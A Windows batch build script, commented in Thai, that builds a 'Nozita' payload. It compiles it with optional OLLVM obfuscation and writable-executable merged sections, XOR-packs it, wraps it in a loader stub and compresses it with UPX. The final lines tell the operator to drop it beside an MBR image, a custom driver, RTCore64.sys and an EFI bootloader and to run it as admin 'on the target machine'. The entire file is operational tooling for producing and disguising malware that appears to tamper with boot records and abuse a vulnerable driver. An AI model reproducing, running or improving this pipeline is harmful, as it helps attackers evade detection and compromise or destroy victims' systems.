@echo off
:: ╔══════════════════════════════════════════════════════════════╗
:: ║         Nozita Build Script                          ║
:: ║  ต้องการ: MSVC (cl.exe) หรือ clang-cl + ollvm               ║
:: ╚══════════════════════════════════════════════════════════════╝

:: ── ตัวเลือก build ────────────────────────────────────────────
:: USE_OLLVM=1  ใช้ clang-cl + ollvm (ต้องติดตั้งแยก)
:: USE_OLLVM=0  ใช้ MSVC ปกติ
set USE_OLLVM=0

:: XOR key สำหรับ packer (hex, ห้ามเป็น 00)
set PACK_KEY=0x37

:: ── step 1: compile payload (main.c จากโฟลเดอร์ nozita) ───────
echo [1/5] Compiling payload...

if "%USE_OLLVM%"=="1" (
    clang-cl /O2 ^
        -mllvm -bcf -mllvm -bcf_loop=2 ^
        -mllvm -fla ^
        -mllvm -sub -mllvm -sub_loop=2 ^
        /I. ^
        ..\nozita2\main.c ^
        /link /SUBSYSTEM:WINDOWS /ENTRY:WinMain ^
        /MERGE:.rdata=.text /MERGE:.data=.text ^
        /SECTION:.text,ERW ^
        /OPT:REF /OPT:ICF ^
        advapi32.lib user32.lib wininet.lib crypt32.lib shell32.lib ntdll.lib ^
        /OUT:payload_plain.exe
) else (
    cl /W4 /O2 /Oi /Ot /GL /GS- /Gy /Zl ^
        /D_CRT_SECURE_NO_WARNINGS ^
        /I. ^
        ..\nozita2\main.c ^
        /link /LTCG ^
        /SUBSYSTEM:WINDOWS /ENTRY:WinMain ^
        /MERGE:.rdata=.text /MERGE:.data=.text ^
        /SECTION:.text,ERW ^
        /OPT:REF /OPT:ICF ^
        advapi32.lib user32.lib wininet.lib crypt32.lib shell32.lib ntdll.lib ^
        /OUT:payload_plain.exe
)

if not exist payload_plain.exe (
    echo [ERROR] payload compile failed
    pause & exit /b 1
)
echo [OK] payload_plain.exe

:: ── step 2: compile stub ───────────────────────────────────────
echo [2/5] Compiling stub...
cl /O2 /GS- /Zl /W4 ^
    stub.c ^
    /link /SUBSYSTEM:WINDOWS /ENTRY:sMain ^
    /NODEFAULTLIB kernel32.lib ^
    /OUT:stub.exe

if not exist stub.exe (
    echo [ERROR] stub compile failed
    pause & exit /b 1
)
echo [OK] stub.exe

:: ── step 3: compile packer ────────────────────────────────────
echo [3/5] Compiling packer...
cl /O2 /W4 packer.c /link /SUBSYSTEM:CONSOLE /OUT:packer.exe
if not exist packer.exe (
    echo [ERROR] packer compile failed
    pause & exit /b 1
)
echo [OK] packer.exe

:: ── step 4: pack payload ──────────────────────────────────────
echo [4/5] Packing payload...
packer.exe payload_plain.exe payload_packed.bin %PACK_KEY%
if not exist payload_packed.bin (
    echo [ERROR] packing failed
    pause & exit /b 1
)
echo [OK] payload_packed.bin

:: ── step 5: combine stub + packed payload ─────────────────────
echo [5/5] Combining stub + packed payload...
copy /b stub.exe + payload_packed.bin payload.exe >nul
if not exist payload.exe (
    echo [ERROR] combine failed
    pause & exit /b 1
)
echo [OK] payload.exe

:: ── optional: UPX ─────────────────────────────────────────────
where upx >nul 2>&1
if %errorlevel%==0 (
    echo [+] UPX found - packing...
    upx --best --ultra-brute payload.exe -o payload_upx.exe >nul 2>&1
    if exist payload_upx.exe (
        echo [OK] payload_upx.exe ^(final^)
        copy /y payload_upx.exe payload.exe >nul
    )
)

:: ── cleanup temp files ────────────────────────────────────────
del /f /q payload_plain.exe payload_packed.bin stub.exe packer.exe >nul 2>&1
del /f /q *.obj *.exp *.lib >nul 2>&1

echo.
echo ════════════════════════════════════════════
echo  Output: payload.exe
echo  Copy payload.exe ไปไว้ใน folder เดียวกับ:
echo    mbr.bin  nozita_drv.sys  RTCore64.sys  bootx64.efi
echo  แล้วเปลี่ยนชื่อ payload.exe เป็น payload.exe
echo  รัน payload.exe as admin บนเครื่องเป้าหมาย
echo ════════════════════════════════════════════
pause
